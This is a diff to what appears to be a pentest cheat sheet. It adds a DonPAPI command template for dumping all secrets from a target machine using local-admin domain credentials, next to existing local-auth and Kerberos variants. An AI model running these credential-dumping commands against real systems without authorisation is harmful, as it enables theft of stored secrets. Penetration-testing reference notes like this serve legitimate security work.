@@ -9,6 +9,10 @@
 DonPAPI -local_auth <user>@<target>
 ```
 
+## DonPAPI - Dump all secrets of the target machine with Local Admin (creds)
+```
+DonPAPI <domain>/<user>:<password>@<target>
+```
 ## DonPAPI - Dump all secrets of the target machine with Local Admin (kerberos)
 ```
 DonPAPI -k <domain>/<user>@<target>
